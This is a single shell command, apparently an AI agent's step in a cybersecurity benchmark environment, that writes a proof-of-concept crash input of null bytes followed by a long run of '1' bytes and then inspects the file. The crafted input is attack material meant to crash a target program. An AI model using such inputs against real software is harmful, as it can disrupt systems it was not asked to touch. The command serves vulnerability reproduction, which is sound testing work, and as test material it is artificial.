python3 -c "open('/CybinGym_workdir/poc_crash','wb').write(b'\x00\x00\x00\x00'+b'1'*(131052-4))" && ls -l /CybinGym_workdir/poc_crash && head -c 16 /CybinGym_workdir/poc_crash | xxd
